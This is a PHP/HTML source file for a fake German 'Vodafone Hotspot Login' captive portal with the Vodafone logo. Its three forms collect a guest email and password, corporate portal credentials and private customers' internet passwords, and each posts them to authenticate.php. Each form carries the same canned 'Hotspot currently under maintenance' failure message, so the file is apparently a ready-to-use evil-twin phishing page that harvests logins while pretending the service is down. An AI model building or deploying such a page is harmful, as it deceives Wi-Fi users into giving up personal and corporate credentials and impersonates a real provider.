<?php
$orig = $_GET['url'] ?? '';
?>
<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Vodafone Hotspot Login</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
<div class="container">
  <div class="header">
    <img src="assets/vodafone-logo.png" alt="Vodafone Logo" />
    <h1>Willkommen</h1>
    <p>im Vodafone-Hotspot mit Highspeed-Internet</p>
  </div>

  <button class="accordion" id="acc-guests">
    <span>als Gast registrieren (3 Stunden Kostenlos/Tag)</span>
  </button>
  <div class="panel" id="panel-guests">
    <form id="form-guests" method="post" action="authenticate.php?url=<?php echo urlencode($orig); ?>">

      <div class="form-group">
        <label for="guest-email">Email</label>
        <input
                type="email"
                id="guest-email"
                name="email"
                placeholder="you@example.com"
                required
        />
        <div class="error-msg" id="guest-email-error">
          Bitte gültige E-Mail eingeben.
        </div>
      </div>

      <div class="form-group">
        <label for="guest-password">Passwort</label>
        <div class="password-wrapper">
          <input
                  type="password"
                  id="guest-password"
                  name="password"
                  placeholder="Mindestens 8 Zeichen"
                  required
          />
          <button
                  type="button"
                  class="toggle-password"
                  tabindex="-1"
                  aria-label="Passwort anzeigen/verbergen"
          >
            <svg
                    class="icon-eye"
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 24 24"
                    width="24"
                    height="24"
            >
              <path
                      fill="#777"
                      d="M12 4.5c-5 0-9.27 3.11-11 7.5 1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 16.5c-2.48 0-4.5-2.02-4.5-4.5S9.52 7.5 12 7.5s4.5 2.02 4.5 4.5S14.48 16.5 12 16.5z"
              />
              <circle fill="#777" cx="12" cy="12" r="2.5"/>
            </svg>
          </button>
        </div>
        <div class="error-msg" id="guest-password-error">
          Passwort muss ≥ 8 Zeichen sein, mit Groß-/Kleinbuchstaben, Zahl & einem der Sonderzeichen „. _ - ? ! %“.
        </div>

        <ul class="password-criteria" id="guest-password-criteria">
          <li id="criteria-lowercase">
            <span class="check-icon"></span> mindestens ein Kleinbuchstabe
          </li>
          <li id="criteria-uppercase">
            <span class="check-icon"></span> mindestens ein Großbuchstabe
          </li>
          <li id="criteria-number">
            <span class="check-icon"></span> mindestens eine Zahl
          </li>
          <li id="criteria-special">
            <span class="check-icon"></span> mindestens eines der Zeichen „. _ - ? ! %“
          </li>
          <li id="criteria-length">
            <span class="check-icon"></span> 8 Zeichen Minimum
          </li>
        </ul>
      </div>

      <div class="form-group">
        <label for="guest-repeat">Passwort wiederholen</label>
        <input
                type="password"
                id="guest-repeat"
                name="repeat"
                placeholder="Passwort wiederholen"
                required
        />
        <div class="error-msg" id="guest-repeat-error">
          Passwörter stimmen nicht überein.
        </div>
      </div>

      <button type="submit">Registrieren</button>

      <div class="submit-error" id="guest-submit-error">
        Login failed code 400, Hotspot currently under maintenance.
      </div>
    </form>
  </div>

  <button class="accordion" id="acc-corp">
    <span>Login zum Corporate Data Access</span>
  </button>
  <div class="panel" id="panel-corp">
    <form id="form-corp" method="post" action="authenticate.php?url=<?php echo urlencode($orig); ?>">

      <div class="form-group">
        <label for="corp-username">Username</label>
        <input
                type="text"
                id="corp-username"
                name="username"
                placeholder="Ihr Benutzername"
                required
        />
        <div class="error-msg" id="corp-username-error">
          Bitte Benutzernamen eingeben.
        </div>
      </div>

      <div class="form-group">
        <label for="corp-password">Portal Passwort</label>
        <input
                type="password"
                id="corp-password"
                name="password"
                placeholder="Ihr Passwort"
                required
        />
        <div class="error-msg" id="corp-password-error">
          Bitte Passwort eingeben.
        </div>
      </div>

      <button type="submit">Login</button>

      <div class="submit-error" id="corp-submit-error">
        Login failed code 400, Hotspot currently under maintenance.
      </div>
    </form>
  </div>

  <button class="accordion" id="acc-private">
    <span>Privatkunden Login</span>
  </button>
  <div class="panel" id="panel-private">
    <form id="form-private" method="post" action="authenticate.php?url=<?php echo urlencode($orig); ?>">

      <div class="form-group">
        <label for="private-username">Username</label>
        <input
                type="text"
                id="private-username"
                name="username"
                placeholder="Ihr Benutzername"
                required
        />
        <div class="error-msg" id="private-username-error">
          Bitte Benutzernamen eingeben.
        </div>
      </div>

      <div class="form-group">
        <label for="private-password">Ihr Internet-Passwort</label>
        <input
                type="password"
                id="private-password"
                name="password"
                placeholder="Ihr Internet-Passwort"
                required
        />
        <div class="error-msg" id="private-password-error">
          Bitte Passwort eingeben.
        </div>
      </div>

      <button type="submit">Login</button>

      <div class="submit-error" id="private-submit-error">
        Login failed code 400, Hotspot currently under maintenance.
      </div>
    </form>
  </div>
</div>

<script src="tabs.js"></script>
</body>
</html>
